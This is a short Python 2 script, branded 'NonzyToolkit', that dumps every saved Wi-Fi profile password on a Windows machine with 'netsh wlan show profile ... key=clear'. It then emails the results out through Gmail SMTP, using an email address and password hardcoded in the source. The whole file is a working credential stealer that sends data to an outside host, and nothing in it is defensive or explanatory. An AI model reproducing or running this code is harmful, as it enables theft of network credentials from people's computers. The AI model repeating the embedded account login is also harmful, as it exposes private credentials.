#!/usr/bin/env python

import subprocess
import smtplib
import re
import pyfiglet 
from termcolor import colored

banner = pyfiglet.figlet_format("NonzyToolkit")
print colored("=" * 60, "green")
print colored(banner, "yellow")
print colored("=" * 60, "green")

def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
	command = "netsh wlan show profile " + network_name + " key=clear"
	wifi_password = subprocess.check_output(command, shell=True)
	
	result = result + wifi_password

send_mail("iwunduchinonso1@gmail.com", "mouau1221108", result)
